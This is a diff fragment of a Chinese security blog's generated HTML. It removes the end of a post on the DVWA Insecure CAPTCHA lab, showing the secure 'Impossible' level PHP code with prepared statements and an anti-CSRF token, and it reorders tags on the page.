CAPTCHA from 3rd party</span></span><br><span class="line">	$resp = recaptcha_check_answer(</span><br><span class="line">		$_DVWA[ <span class="string">'recaptcha_private_key'</span> ],</span><br><span class="line">		$_POST[<span class="string">'g-recaptcha-response'</span>]</span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">	<span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">		<span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">		$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Check that the current password is correct</span></span><br><span class="line">		$data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">		$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">		<span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			$data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">			$data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">			$data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">			$data-&gt;execute();</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">			$html .= <span class="string">"&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;"</span>;</span><br><span class="line">			$hide_form = <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>Impossible难度加入了<code>Anti-CSRF token</code>验证，并且防止了sql注入，还要输入原密码才能更改，将更改密码的验证过程巩固地很安全</p>
-<hr>
-<p>参考文章：</p>
-<p><a href="https://www.freebuf.com/articles/web/119692.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/119692.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">DVWA</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/02/15/DVWA 6-Insecure CAPTCHA（不安全的验证码）/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/Knlvre.github-io/page/3/">&laquo; Prev</a><a class="page-number" href="/Knlvre.github-io/">1</a><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/Knlvre.github-io/page/5/">5</a><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/5/">Next &raquo;</a>
@@ -1716,11 +1761,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1732,11 +1777,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
+                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">博客搭建</a>
+                <a href="javascript:void(0)" class="js-tag color5">Sqli-labs</a>
               </li>
             
             <div class="clearfix"></div>
